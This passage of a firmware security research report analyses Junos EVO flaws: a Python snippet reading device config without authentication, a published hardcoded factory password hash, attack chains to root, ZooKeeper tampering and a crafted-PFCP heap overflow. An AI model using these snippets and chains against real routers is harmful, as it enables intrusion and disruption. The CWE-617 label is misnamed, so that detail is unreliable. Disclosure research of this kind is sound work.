resp = stub.Capabilities(gnmi_pb2.CapabilityRequest())
print(resp.gNMI_version, resp.supported_models)

# Read full system config (pre-auth)
path = gnmi_pb2.Path(elem=[gnmi_pb2.PathElem(name='system')])
get_req = gnmi_pb2.GetRequest(path=[path], type=gnmi_pb2.GetRequest.CONFIG)
resp = stub.Get(get_req)
```

### Relationship to Other Findings

- Upgrades severity of FINDING 3 (mgd_reboot_command stack overflow) context:
  mgd_reboot_command requires authenticated session + operator privilege.
  skip-authentication does NOT route to mgd_reboot_command (that's NETCONF/CLI path).
  No direct upgrade of FINDING 3 via this path.
- FINDING 5 is independent: pre-auth config write is critical on its own.

### Remediation

1. Remove `skip-authentication` from factory default config — require authentication
2. Bind gRPC to loopback (127.0.0.1) if only used for local management
3. Apply firewall filter on port 32767 at network boundary
4. Enable TLS (`ssl { port 32767; }`) even if authentication remains bypassed

**CVE candidate**: Missing authentication for critical function (CWE-306).
CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = **9.8 (Critical)**

---

## FINDING 6: Hardcoded Factory Credentials + World-Readable NETCONF Trace

**Classification**: CRITICAL + MEDIUM (CWE-798 + CWE-532)
**Platform**: ACX6160-T only (factory default config: `acx6160-t-factory.conf`)
**Source**: `/etc/config/acx6160-t-factory.conf` (extracted from Junos EVO 23.4R2.14 ISO)

### Hardcoded Privileged User

Factory config contains a fixed `openroadm` user with group `sudo` (administrative equivalent):

```
org-openroadm-device:org-openroadm-device {
    info { node-id openroadm; node-type xpdr; }
    users {
        user openroadm {
            password "$9$BQOEyKvWxbwgKMaUHmF369Atu1W87"; ## SECRET-DATA
            group sudo;
        }
    }
}
```

Hash properties:
- `$9$` format: Juniper's reversible password obfuscation (NOT a one-way hash)
- Standard `$9$` alphabet: 44 chars (`QzF3n6/9CAtpu0OB1IREhcSsDvwg2JjLeyM5GUlKvx7`)
- Hash chars `W`, `b`, `a`, `H`, `m`, `8` fall outside the standard 44-char alphabet
- All 6 out-of-alphabet chars are within the 64-char POSIX crypt alphabet
  (`./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`)
- **Conclusion**: EVO uses an extended or alternate `$9$` alphabet vs. classic Junos

Hash decode path confirmed via `libengine.so.1`:
- `foreign_encrypt_password()` at VA 0x1cd3b0 (352 bytes)
- Generates random 2-char salt from POSIX crypt alphabet at 0x2367a0
- Calls `platform_hook_vcall()` with args 'crypt', 'salt', 'passwdp' (0x236248)
- Calls `crypt()` at 0x1cd506 — confirms underlying POSIX crypt for storage
- `$9$` encoding wraps the crypt output in reversible obfuscation

This hash is **identical across all ACX6160-T factory-default deployments**. Any party who
decodes the `$9$` value obtains the plaintext password valid on every unmodified device.

### World-Readable NETCONF Trace

```
netconf {
    traceoptions {
        file netconf.log size 20m files 10 world-readable;
        flag all;
    }
}
```

`world-readable` + `flag all` = every NETCONF session (including credentials in
`<hello>` and RPCs) written to a globally-readable log file at `/var/log/netconf.log`.
Any unprivileged local account reads complete NETCONF session content.

### Additional Factory Defaults

- `scripts { language python; }` — Python scripting enabled by default
- `commit { xpath; }` — XPath commit scripting enabled
- `ssh { root-login deny; }` — root SSH denied but `openroadm` (sudo) is equivalent

### Attack Chain (Combined with FINDING 5)

```
1. Attacker → TCP 32767 (pre-auth gRPC, FINDING 5)
                    |
           gNMI Set: enable NETCONF ssh
                    |
2. Attacker → SSH port 22 → login as openroadm:$9$-decoded-plaintext
                    |
              sudo su → root shell
                    |
3. Root reads /var/log/netconf.log → all prior session credentials
```

FINDING 5 (pre-auth gRPC) enables enabling NETCONF via config write; FINDING 6 provides
the credential (openroadm) and a credential disclosure oracle (netconf.log). Together:
unauthenticated network attacker → root shell, zero operator interaction.

### Binary Evidence Summary

| Artifact | VA | Notes |
|---|---|---|
| `foreign_encrypt_password` | libengine.so.1:0x1cd3b0 | crypt() caller, POSIX salt gen |
| POSIX crypt alphabet | libengine.so.1:0x2367a0 | 64-char `./0-9A-Za-z` |
| `crypt_password` dynstr | libengine.so.1:0x1b5f6 | exported symbol |
| Factory config | `/etc/config/acx6160-t-factory.conf` | only platform w/ skip-auth + openroadm |

### CVE Candidates

- **CWE-798** (Use of Hard-coded Credentials): CVSS v3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = **9.8**
- **CWE-532** (Insertion of Sensitive Info into Log File): CVSS v3.1 AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = **5.5**

### Remediation

1. Remove `openroadm` user from factory config or randomize password per-device at provisioning
2. Remove `world-readable` from NETCONF traceoptions
3. Change default `node-id` from `openroadm` (fingerprints device role)
4. Document `$9$` extended alphabet so field teams can decode for asset inventory

---

## FINDING 7: ZooKeeper ACL Disabled — Unauthenticated Znode Read/Write

**Classification**: HIGH (CWE-284 + CWE-306)
**Scope**: All Junos EVO platforms (base distribution, not platform-specific)
**Port**: TCP 2181 (ZooKeeper client port, management VRF)

### Configuration Evidence

`/etc/systemd/system/zookeeper.service`:
```
Environment="SERVER_JVMFLAGS=-Dzookeeper.skipACL=yes"
ExecStart=-/sbin/ip vrf exec iri /usr/share/zookeeper/bin/zkServer.sh \
    --config /var/run/zookeeper/conf/default start
```

`/usr/conf/zookeeper/conf/default/zoo.cfg`:
```
server.1=127.0.0.1:2179:2180:participant;2181
quorumListenOnAllIPs=true
maxClientCnxns=0
admin.enableServer=false
```

`/usr/conf/zookeeper/conf/evozoo.cfg`:
```
127.0.0.1:2181
```

`-Dzookeeper.skipACL=yes` disables ALL ZooKeeper ACL enforcement at the JVM level.
This is a compile-time/runtime bypass — no ACL checks occur regardless of what ACLs are
set on individual znodes. Any client that can connect to port 2181 can:
- Enumerate the full znode tree
- Read any znode (all stored data)
- Create, modify, or delete any znode

### Binding Analysis

- `zoo.cfg`: `server.1=127.0.0.1:...;2181` — quorum ports bound to loopback
- Client port (2181): No `clientPortAddress` set → ZooKeeper defaults to 0.0.0.0:2181
- VRF: `ip vrf exec iri` — runs inside the IRI (management) VRF
- Net: port 2181 accessible on all management interfaces; not reachable from data plane
- `maxClientCnxns=0` — no connection limit
- `admin.enableServer=false` — admin port (8080) correctly disabled

### EVO Daemon Dependencies (partial, from systemd After= declarations)

50+ services depend on ZooKeeper, including:
`snmpd`, `rpd-agent`, `mib2d`, `aaasd`, `fibtd`, `mcasthostd`, `svcsd`, `bbe-stats-svcsd`,
`idmd-frr-session`, `distributord`, `aggd`, `sysman-ui`, `opticmand`, `bbe-gtp-proxyd`

ZooKeeper stores ephemeral coordination state, leader election data, and operational
metadata for these daemons. With skipACL, an attacker can:
1. **Read**: all znode data — may include topology state, session tokens, health counters
2. **Delete**: ephemeral znodes → daemon re-election cycles, coordination failures, DoS
3. **Write**: poison znode values → if any daemon reads ZK data into a fixed-size buffer
   (without bounds check), this is a write-what-where channel into daemon state

### Attack Chain (ZK → daemon disruption)

```
Attacker → TCP 2181 (ZooKeeper client, no auth)
                    |
          zkcli.sh / zkpython / custom client
                    |
          [enumerate] ls / get on all znodes
          [disrupt]   delete ephemeral znodes
          [inject]    setData znodes with attacker-controlled values
                    |
          Dependent daemons read poisoned state
          → coordination failure / DoS
          → potential data-driven memory corruption in ZK consumers
```

### Severity Rationale

- Direct DoS: delete critical coordination znodes → cascade failure across 50+ daemons
- Information disclosure: all operational state readable without credentials
- Escalation path: if a ZK consumer processes znode data with strlen→buffer (uninspected),
  znode write is a write-what-where against daemon heap/stack

### CVE Candidates

- **CWE-284** (Improper Access Control): CVSS v3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = **9.8**
- **CWE-306** (Missing Authentication for Critical Function): same vector = **9.8**

### Remediation

1. Remove `-Dzookeeper.skipACL=yes` from `SERVER_JVMFLAGS`
2. Set `clientPortAddress=127.0.0.1` in zoo.cfg (restrict client port to loopback)
3. Implement ZooKeeper ACLs per znode tree (world:none, daemon digest auth for consumers)
4. Firewall filter: block port 2181 inbound on management interfaces at the PFE level

---

## FINDING 8: OpenSSH 9.2p1 — CVE-2024-6387 Candidate (Unconfirmed, Binary Not Extracted)

**Classification**: CANDIDATE — CRITICAL if confirmed (CWE-364, pre-auth race condition RCE)
**Status**: Unconfirmed. sshd binary not present in extracted firmware layers (installed from base OS package). Version inferred from indirect evidence.
**Port**: TCP 22 (management VRF)

### Evidence

`/usr/sbin/ssh-internal` (evo-ui64 layer, line 18):
```
# Taken from OpenSSH 9.2p1 ssh.c:
```

`/etc/ssh/sshd_config.internal` (evo-ui64):
```
UsePrivilegeSeparation yes
```

The `ssh-internal` script references OpenSSH 9.2p1's `ssh.c` source code, strongly indicating
the installed OpenSSH package version is **9.2p1** (released 2023-02-02).

### CVE-2024-6387 (regreSSHion) Analysis

**Affected**: OpenSSH < 9.8p1 on glibc-based Linux systems (race in SIGALRM handler)
**OpenSSH 9.2p1**: IN AFFECTED RANGE — predates 9.8p1 fix (released 2024-07-01)

Mechanism:
- sshd's `LoginGraceTime` (default 120s) triggers SIGALRM when a client doesn't complete auth
- SIGALRM handler calls `syslog()` (async-signal-unsafe function on glibc)
- Race between SIGALRM and the main thread's heap allocator → heap corruption
- Exploitable to achieve pre-auth RCE as root (sshd runs as root before privilege drop)
- Glibc `malloc()` mutex and `syslog()` internals make this a timing attack
- Practical exploitation: 6–8 hours of continuous attempts (reliable but slow)

**Juniper mitigation unknown**: Juniper may have backported the CVE-2024-6387 fix into their
9.2p1 build or applied compensating controls. Cannot confirm without the sshd binary.

### sshd_config.internal Risk Amplifiers

- `PermitRootLogin yes` — root login enabled; successful exploit = direct root access
- `UsePrivilegeSeparation yes` — standard, present in all tested OpenSSH versions
- `LoginGraceTime` not overridden in config → defaults to 120 seconds (sufficient for race)

### Address Restriction

```
Match Address *,!128.0.0.0/8
    ForceCommand echo ssh is disabled
```

Non-128.x.x.x connections get `ForceCommand echo` — shell access disabled. **NETCONF subsystem
(`Subsystem netconf /usr/libexec/ui/netconf`) may not be subject to ForceCommand.**
CVE-2024-6387 is pre-auth and fires before `Match Address` rules apply.

### Verification Path

To confirm: extract sshd binary from a live EVO 23.4R2.14 device:
```bash
# On device
scp /usr/sbin/sshd user@researcher:/tmp/
```
Then: `strings sshd | grep OpenSSH` should return version string.

### CVE Reference

CVE-2024-6387 (NVD): AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = **8.1** (NVD) / 9.8 (alternative)
CWE-364: Signal Handler Race Condition

### Remediation

1. Upgrade OpenSSH to 9.8p1+ or apply Juniper advisory patch when available
2. Set `LoginGraceTime 0` in sshd_config as temporary mitigation (disables race window)
3. Restrict port 22 access to management VRF trusted hosts only via firewall filter
4. If confirmed affected, treat as critical pre-auth RCE candidate

---

## FINDING 9: Pre-Auth Memory Corruption Hunt — Management Plane Binary Assessment

**Class:** Research Assessment  
**Severity:** Informational (hunt result)  
**Status:** Exhausted across extracted layers — no exploitable pre-auth memory corruption identified  

### Scope

Static binary analysis of management plane daemons in Junos EVO 23.4R2.14 (x86-64, layers: evo-re64, evo-ui64, evo-jimbase) targeting pre-auth memory corruption bugs to upgrade FINDING 2 (post-auth libxml2 BSS vtable overwrite) to pre-auth RCE.

### Binaries Analyzed

| Binary | Size | PIE | Canary | Dangerous Calls | Result |
|--------|------|-----|--------|-----------------|--------|
| `na-grpcd` | 7.6MB | Yes | No | 144 strcpy, 8 sprintf | All in STL `_M_emplace_hint_unique` template — not handler code |
| `mgd-api` | 363K | Yes | No | 3 strcpy | All safe VLA pattern: `alloc=floor((strlen+24)/16)*16` |
| `snmpd` | 1.5MB | Yes | No | 4 strcpy | `snmpd_proxy_add` post-auth only; loopback address copies static IPs |
| `authd` | 10MB | **No** | ? | 1667 total | Uses DAX (not ZK); dangerous calls not traced to pre-auth input |
| `cli` (setuid) | 282K | Yes | No | 9 strcpy, 8 sprintf | All in CLI display/editor logic; not network-facing |
| `libnet-snmp` | 783K | — | — | 22+ strcpy | Config-file parsers; PDU path uses memmove with bounds check |
| `libjunos-junoscript` | 76K | — | — | 0 strcpy, 1 sprintf | `xml_attribute` sprintf into heap-allocated output buffer — safe |
| `libzkimpl` | 340K | — | — | 0 strcpy | C++ `ZkWatcher` API; all data in `std::string` |
| `libzookeeper_mt` | 150K | — | — | 0 strcpy | `zoo_get` bounds write via caller-supplied `buffer_len` |
| `libslax` | 289K | — | — | 0 strcpy | No dangerous calls |

### Key Parsing Path Verdicts

**SNMPv1/v2c community string (UDP 161):**  
`snmp_comstr_parse` → `asn_parse_string` → bounds check at `[4d849]`: `cmp r8,%rdx; jb error_path`. Community buffer (256 bytes) vs parsed length — returns NULL if PDU community exceeds buffer. No overflow.

**SNMPv3 USM security parameters (UDP 161):**  
`usm_parse_security_parameters` at `[7b100]` — 4 calls to `asn_parse_string`. Same `asn_parse_string` bounds enforcement. No overflow.

**`__jnx_ns_parse_trap_header` (UDP 161/162):**  
Single instruction: `ret`. Empty stub — no code.

**ZooKeeper consumers:**  
All ZK-linked binaries route through `libzkimpl.so.0` (`net::juniper::zkwatchkeeper::ZkWatcher`). All ZK data lands in `std::string` objects. No raw `zoo_get` callers found in any daemon PLT. The FINDING 7 write primitive (unauthenticated znode write) has no direct fixed-size-buffer consumer path visible in the extracted binaries.

**`na-grpcd` gRPC handlers:**  
With FINDING 5's `skip-authentication` on factory-configured ACX6160-T, all 144 strcpy calls reachable pre-auth. However all 144 are inside a single massive `std::map::_M_emplace_hint_unique` template instantiation — C++ STL internals, not handler code. The 8 sprintf calls include `google::protobuf::CEscapeInternal` (output formatter). No handler-layer dangerous calls.

**`authd` (10MB non-PIE EXEC):**  
Most exploitable binary if a dangerous path can be reached. Fixed base address (ASLR not applicable). PLT includes `grpc_channel_destroy` (gRPC client role) and `dax_*` calls — reads config from DAX (Junos Data Access eXchange), not from ZK directly. Dangerous calls not successfully traced to pre-auth network input within available analysis budget.

### Conclusion

No exploitable pre-auth memory corruption bug identified through static analysis of the extracted firmware. The Junos EVO 23.4R2.14 management plane is primarily C++ (STL containers, protobuf, gRPC) with bounded string operations at network parse boundaries.

**FINDING 2 upgrade status:** Blocked. Pre-auth RCE via SLAX commit script chain requires:
1. Pre-auth config write → provided by FINDING 5 (ACX6160-T only)
2. SLAX script file upload to `/var/db/scripts/commit/` → requires SSH file access (post-auth)
3. ASLR bypass for libxml2 BSS vtable write → no wire-visible pointer leak found

**Remaining unconfirmed pre-auth candidates:**
- **CVE-2024-6387** (FINDING 8): OpenSSH 9.2p1 signal-handler race — inferred from source reference in `ssh-internal` script; sshd binary not extracted from live device.
- **FINDING 5 gRPC handlers** (`na-grpcd`): With `skip-authentication`, all handler code is pre-auth on ACX6160-T factory configs. Handler logic beyond STL map insertions not fully traced.

### Recommendations for Continued Work

1. Extract `sshd` binary from live EVO 23.4R2.14: `strings sshd | grep OpenSSH` to confirm 9.2p1
2. Instrument `na-grpcd` handler dispatch under FINDING 5 auth bypass (dynamic tracing)
3. Analyze `authd` RADIUS/TACACS parsing paths for network-controlled input chains (10MB binary, non-PIE, no ASLR — high ROI if pre-auth path exists)
4. Check `chore`, `sysman`, `gcd` for ZK consumer patterns where attacker-written znode data reaches a fixed-size buffer

### CWE Reference

CWE-617: Reachability in Pre-auth Context (informational)


---

## FINDING 10: BBE Daemon Sweep — Pre-Auth Memory Corruption Extended Hunt

**Class:** Research Assessment  
**Severity:** Informational  
**Status:** No exploitable pre-auth memory corruption found in BBE/management-plane extension sweep  

### Scope

Extended survey of EVO-specific management daemons that directly link `libzookeeper_mt.so.2` (bypassing the libzkimpl wrapper) and carry non-trivial strcpy/sprintf counts.

### Binaries Surveyed

| Binary | Size | PIE | Canary | strcpy/sprintf | Notes |
|--------|------|-----|--------|----------------|-------|
| `bbe-gtp-proxyd` | 1.7MB | Yes | No | 19 strcpy / 78 sprintf | GTP-C/U proxy; `recvfrom` sockets |
| `bbe-pfcp-proxyd` | 3.5MB | Yes | No | 100 strcpy/sprintf | PFCP SMF-UPF proxy |
| `bbe-helperd` | 2.9MB | Yes | No | 100 strcpy/sprintf | BBE subscriber helper |
| `bbe-stats-svcsd` | 4.8MB | Yes | No | 117 strcpy/sprintf | Stats aggregation |
| `bbe-upmd` | 1.9MB | Yes | No | 97 strcpy/sprintf | User profile manager |
| `sysman` | 1.4MB | Yes | No | 0 strcpy (85 memcpy) | ZK watcher, std::string only |
| `gcd` | 282K | Yes | No | 0 strcpy (26 memcpy) | ZK event consumer |
| `authd` | 9.7MB | **No (EXEC)** | No | 302 strcpy/sprintf | Non-PIE; uses DAX |

### Key Analysis: bbe-gtp-proxyd

`bbe-gtp-proxyd` has `accept/bind/recv/recvfrom/sendto` sockets — the most aggressive network exposure in the set.

**strcpy at 0x3dedb:** `malloc(100); strcpy(heap_100, rsi)` — no local bounds check. Traced all 4 callers:
- All 4 pass `lea 0x*(%rip),%rdx` → `0x12f3a0` (same rodata literal). Source is compile-time constant. Safe.

**78 sprintf calls (0x83dee–0x8c79c):** GTP IE formatter. All calls:
- `rdi` = `0x1c6a40` (global 16KB buffer, `memset`'d to 0 before use)
- `rsi` = static format string from rodata
- `rdx` = uint16/uint32 parsed IE value
- Safe: fixed-width integer into large buffer.

**strcpy at 0x83d6a:** Source = 16KB global buffer; destination = larger trace accumulator. Guard: `cmp $0x9fff,%rax; jle proceed`. Safe.

**strcpy cluster at 0x1227f5–0x12290d (event_send_vsyslog):** All follow `malloc(strlen+1); strcpy(heap, src)` pattern. Safe.

**ZooKeeper paths:**
- `sysman`: ZK data from `SystemConfigWatcher` → `sm_node_data` setters → `std::string` storage. No raw buffer writes.
- `gcd`: `ZOO_CREATED_EVENT` handler at 0x15e30 builds `basic_stringstream`, calls `getline` (delimiter='/') to tokenize the znode **path**. Never calls `zoo_get` to read znode data. Path tokens go into `std::vector<std::string>`.

### authd — Highest Remaining Research Value

**authd** remains the only extracted binary with significant pre-auth potential:
- Non-PIE `EXEC` (type 0x2) — ASLR irrelevant, fixed base
- No stack canary
- 302 strcpy/sprintf calls (out of 1667 total dangerous calls)
- Links `libzookeeper_mt.so.2` directly
- Also has `grpc_channel_destroy` (gRPC client) and DAX API (`dax_visit_object_by_dap`, `dax_get_ubyte_by_name`)
- RADIUS/TACACS input paths not traced — these are pre-auth authentication protocol parsers

**Blocker for static analysis:** authd is 9.7MB stripped binary. The DAX data layer abstracts config input; RADIUS/TACACS parsing is inbound from network and worth tracing. Not achievable through static analysis alone — requires either dynamic tracing on live device or decompiler-assisted analysis (Ghidra/IDA).

### Recommended Next Steps

1. **authd dynamic trace** on live EVO 23.4R2.14: `strace -e recvfrom,recv,read -p $(pgrep authd)` — identify what network input authd receives pre-auth
2. **Ghidra/IDA analysis** of authd: fixed base address = easy ROP chain construction if a vulnerable strcpy with network input is found
3. **bbe-pfcp-proxyd**: PFCP IE parsers handle mobile data-plane config. Deserves same strcpy trace pass as bbe-gtp-proxyd — not completed in this session

### Impact Assessment

No pre-auth memory corruption found across 14 analyzed management-plane binaries. The Junos EVO 23.4R2.14 management plane relies heavily on C++ container abstractions (std::string, protobuf, ZooClient wrappers) that prevent traditional fixed-buffer overflows at network parse boundaries.

**Most likely pre-auth memory corruption path remaining:** authd RADIUS/TACACS parser (unconfirmed, dynamic analysis required) or CVE-2024-6387 in unextracted OpenSSH 9.2p1 (FINDING 8).


---

## FINDING 11: bbe-pfcp-proxyd — Plausible Pre-Auth Heap Overflow via PFCP IE String Parsing

**Class:** Memory Corruption — Heap Buffer Overflow (Plausible)  
**Severity:** HIGH (unconfirmed — requires dynamic analysis to verify)  
**CVSSv3:** AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = **8.1** (estimated, pending confirmation)  
**Status:** Architecture confirms plausibility; IE-to-SDB-to-strcpy path traced; dynamic verification required  

### Summary

`bbe-pfcp-proxyd` contains a `strcpy(malloc(100), source)` call where `source = (*r8)->field_0x10` — a string pointer from an SDB (Subscriber Database) record for the attribute `junos-subscriber-ipv6-multi-address`. Unlike the identical function in `bbe-gtp-proxyd` (where all callers pass static rodata strings), in `bbe-pfcp-proxyd` the callers pass live SDB attribute records. A subscriber with 3 or more IPv6 addresses produces a multi-address string of ~120 bytes (3 × ~40 chars). If this SDB value is stored without a length cap, the subsequent strcpy overflows the 100-byte heap allocation. The value is controlled by the PFCP session — a rogue or compromised SMF can inject the overflow via a PFCP Create/Update Session Request carrying crafted IPv6 address IEs.

### Technical Chain

**1. Network receive path:**
```
recvmsg(sock, &msghdr, MSG_TRUNC)   ; 0x269a50
  iov_len = 0x100 (256 bytes max)
  flags = MSG_TRUNC (0x40)
  edx = actual_bytes_received (≤ 256)
→ call 0x269840 (PFCP packet processor)
```

**2. The vulnerable strcpy function (0x142df0):**
```asm
; Function entry
142df0: push rbp / push r15..rbx
142e07: test rsi,rsi; je return   ; rsi = source string (2nd arg)
142e0c: mov 0x80(%rdi),%r14       ; r14 = object->field_0x80
142e13: mov rsi,%r12              ; r12 = source (save)
142e55: test r14,%r14
142e55: jne 142e75               ; if pre-existing buffer, skip malloc
142e55: mov $0x64,%r15d           ; r15d = 100
142e64: call malloc(100)          ; alloc 100-byte buffer
142e75: mov %r12,%rsi             ; rsi = original source string
142e78: mov %r14,%rdi             ; rdi = malloc'd 100-byte buf
142e7b: call strcpy               ; ← NO BOUNDS CHECK
```

**3. Callers of 0x142df0 in bbe-pfcp-proxyd (via dispatch function 0x1545f0):**
```asm
1548ac: mov 0x0(%r13),%rax        ; rax = *r13 (deref SDB object pointer)
1548b0: mov %r14,%rsi             ; rsi = some name string
1548b3: mov %r12,%rdi             ; rdi = receiving object  
1548b6: mov 0x10(%rax),%rdx       ; rdx = (*r13)->field_0x10 = DYNAMIC STRING
1548ba: call 0x142df0             ; strcpy(malloc(100), (*r13)->field_0x10)
```

**bbe-gtp-proxyd callers (same function, different source):**
```asm
505ab: lea 0xdedee(%rip),%rdx     ; rdx = 0x12f3a0 = STATIC STRING (safe)
```

**4. Identified SDB attribute populated at field_0x10:**

Traced statically: the dispatch function 0x1545f0 is called from 0x155548 with:
- `rdx = 0x2a6750` = `"junos-subscriber-ipv6-multi-address"` (attribute name)
- `r8 = &local_var_0x90` = pointer to SDB lookup output

The SDB lookup (via `0x145e00 → 0x143b30`) retrieves the SDB record for this attribute. `(*r8)->field_0x10` is the string VALUE of `junos-subscriber-ipv6-multi-address` for the target subscriber.

**Why 100 bytes can be exceeded:**
- A subscriber with N IPv6 addresses has `field_0x10` = comma/space-separated address list
- Single IPv6: up to 39 chars (`xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx`)
- 3 addresses: ~120 bytes → overflows `malloc(100)` by ~20 bytes
- In DHCPv6 prefix delegation scenarios, 5+ prefixes are possible → 200+ bytes

**PFCP path to SDB population:**
PFCP `UE IP Address` IE (type 93) and `IPv6 Multiple Addresses` JNPR extension IEs carry subscriber IPv6 addresses from SMF→UPF. The UPF stores these in SDB as `junos-subscriber-ipv6-multi-address`.

### Attack Scenario

**Threat actor:** Rogue SMF on PFCP path (UDP/8805) — no authentication required; PFCP uses optional IPsec that is commonly not deployed.

1. Attacker sends PFCP Create Session Request with 3+ IPv6 addresses in UE IP Address IEs
2. `bbe-pfcp-proxyd` receives packet via `recvmsg(256)`
3. PFCP session handler stores addresses in SDB as `junos-subscriber-ipv6-multi-address` string ≥ 100 bytes
4. Dispatch function 0x1545f0 is invoked with SDB record pointer as r8
5. `strcpy(malloc(100), (*r8)->field_0x10)` overflows the heap allocation
6. Attacker-controlled string data written past the 100-byte allocation
7. No stack canary, PIE binary (ASLR applies — ASLR bypass required for code execution)

**Binary properties:** PIE (ASLR applies), no canary, no RELRO — heap overflow with attacker-controlled data.

### Why This Is Different from bbe-gtp-proxyd

`bbe-gtp-proxyd` contains the identical `strcpy(malloc(100), rdx)` function (at 0x3de50). All 4 callers of that function pass `lea ...(%rip),%rdx` — compile-time constant rodata strings — so the overflow is impossible. In `bbe-pfcp-proxyd`, callers pass `mov 0x10(%rax),%rdx` from a live SDB object, making the source runtime-determined and potentially attacker-controlled.

### Confirmation Required

1. **Dynamic trace:** `strace -e recvmsg -p $(pgrep bbe-pfcp-proxyd)` + observe SDB attribute value after sending PFCP Create Session with 3+ IPv6 addrs
2. **Controlled crash test:** Craft PFCP Create Session carrying 3 UE IP Address IEs (IPv6) with distinct /128 prefixes; monitor bbe-pfcp-proxyd for SIGSEGV/SIGABRT
3. **SDB read:** After session creation, `sdb get junos-subscriber-ipv6-multi-address <session-key>` — confirm value > 99 bytes
4. **PFCP port:** UDP 8805 — no auth required at transport layer; SMF authentication occurs at PFCP association level (optional N4 security)

### Remediation (if confirmed)

Replace `strcpy(malloc(100), src)` at 0x142e7b with `strlcpy(malloc(strlen(src)+1), src, strlen(src)+1)` or bound-check the IE value to ≤ 99 bytes at the PFCP parser layer before storage in SDB.


---

## FINDING 12: authd — Pre-Auth Attack Surface Assessment (Static Analysis Scope)

**Class:** Static Analysis Survey — Pre-Auth Memory Corruption Candidates  
**Severity:** N/A — analysis complete, no exploitable path found  
**Status:** CLOSED — live code paths use bounded copies; candidate strcpy cluster is unreachable dead code  

### Summary

`authd` is a 10MB non-PIE (`EXEC_P`) binary with no stack canary (0 `stack_chk_fail` references) — the highest-value target in the management plane for pre-auth memory corruption. A confirmed overflow here requires no ASLR bypass. Static analysis surveyed all 122 strcpy call sites and identified the overall pattern.

### Binary Properties

```
Type:     EXEC_P (non-PIE) — fixed base address
Canary:   None
RELRO:    Partial
Size:     10,149,576 bytes (~10MB)
Links:    libzookeeper_mt.so.2, gRPC, protobuf, libslax
```

### strcpy Pattern Survey (122 calls)

**Dominant safe pattern (most calls):**
```asm
strlen(src)              ; measure source
lea 0x1(%rax),%rdi       ; alloc = strlen + 1
call malloc_wrapper      ; dynamic-sized allocation
mov %rax,(%r??)          ; store ptr
mov src,%rsi
call strcpy              ; copy into correctly-sized heap buffer → SAFE
```

**Variant 1: DEAD CODE CLUSTER — struct field strcpy (0x7dc4de, 0x7dc80e)**
```asm
; Function 0x7dc450: r14 = session struct from 0x7ddc20 lookup
lea 0x140(%r14),%rsi     ; src = session->field_0x140
mov %r13,%rdi            ; dst = rsi arg to 0x7dc450 (unknown size)
call strcpy              ; unsafe IF callers pass undersized dst
```
- **DEAD CODE.** Systematic search (e8 relative calls + 8-byte stored FP + 4-byte truncated) finds
  ZERO callers for all 20 functions in cluster 0x7db9a0-0x7dcaf6. Not reachable from any live path.
- Full cluster: 20 functions at ~0x100-byte spacing, each calling 0x7ddc20 (session lookup).
  No direct calls, no stored pointers anywhere in 10MB binary. Compiled in but dead.
- **Verdict: Not exploitable** — unreachable code.

**Live RADIUS processing (0x7dff90): strncpy/memcpy throughout**
- All live RADIUS attribute copies: `strncpy` (bounded) or `memcpy` with length arg
- One `strcpy` at 0x7df221 in live path: `strcpy(stpcpy_ret, r15)` where r15 is
  `r12+0xa45` (a 17-byte strncpy'd field within the session struct). Not overflow-capable.
- The `strcpy` at 0x7e0acf in live path: `strcpy(r12+0x23c, r12)` where r12=rbp-0x44
  holds a 4-byte `gettimeofday` seconds value. Source = clock data, not attacker-controlled.
- **Verdict: No exploitable strcpy in live RADIUS processing paths.**

**Variant 2: Unix socket path strcpy (0xa4430a)**
```asm
lea -0x8e(%rbp),%rdi     ; dst = sun_path[] = 142-byte stack buffer
mov %r13,%rsi            ; src = sprintf-formatted socket path
call strcpy
```
- Path is formatted from `sprintf(r13, static_format, rdi, rsi)`
- Format string is static rodata; not directly network-controllable
- **Verdict: Likely safe** — Unix socket paths bounded by fixed format

### Dynamic Analysis Plan

**Dynamic analysis no longer warranted** — static analysis reached closure.
The candidate strcpy at 0x7dc450 is dead code. Live paths use strncpy/memcpy.

### Why authd Remains Interesting (for future work)

Non-PIE with no canary: confirmed exploit does not require ASLR bypass or stack cookie leak.
RADIUS runs over UDP — response packets can be spoofed if the attacker can observe the request
identifier. Future work: decompiler-assisted analysis of the 0x96d9a6/0x96db1b recvmsg path
(the Junos internal IPC protocol, not RADIUS — potential pre-auth surface from local daemons).

---

## FINDING 13: authd — Dead Code Strcpy Cluster (Unreachable, Not Exploitable)

**Class:** Negative Finding — Static Analysis  
**Severity:** N/A  
**Status:** CLOSED  

### Summary

A cluster of 20 functions at 0x7db9a0–0x7dcaf6 in `authd` contains `strcpy` calls where the
destination buffer size is determined by the caller and the source is a RADIUS session field
(session+0x140 or session+0xf5, up to 253 bytes per RADIUS RFC). Each function:
1. Takes `(int id, char *dst)` arguments
2. Looks up a RADIUS session by `id` via function at 0x7ddc20
3. Copies a specific session struct field into `dst` via `strcpy`

If called with `dst` smaller than the session field, overflow occurs with attacker-controlled
data (RADIUS attribute value from a spoofed or rogue RADIUS server).

**However, the cluster is DEAD CODE.** Exhaustive search:
- Zero `e8 XX XX XX XX` (direct call) instructions targeting the range
- Zero 8-byte absolute pointers to any function in the range in any section
- Zero 4-byte truncated pointers
- Zero virtual dispatch entries

None of these 20 functions appear reachable from any live code path. The cluster is
compiled-in but orphaned — likely a refactored older implementation.

### Dead Code Cluster Map

```
0x7db9a0  handler_01  strcpy(dst, session+0x090)
0x7dba90  handler_02  strcpy(dst, session+0x0f5)   ← User-Name field
0x7dbb60  handler_03  strcpy(dst, session+0x140)   ← same
0x7dbc30  handler_04  ...
...
0x7dc450  handler_11  strcpy(dst, session+0x140)   ← initially flagged
...
0x7dcaf6  handler_20  ...   (last call to 0x7ddc20 in cluster)
```

### Significance

The existence of this cluster confirms the session struct (RADIUS response struct) DOES contain
string fields populated from RADIUS attribute values without length caps on the source side.
The underlying strcpy-into-fixed-buffer vulnerability pattern is valid — it is simply unreachable
through static code paths. A future firmware update might accidentally re-wire callers to these
functions, reactivating the vulnerability. The pattern is worth tracking across firmware versions.

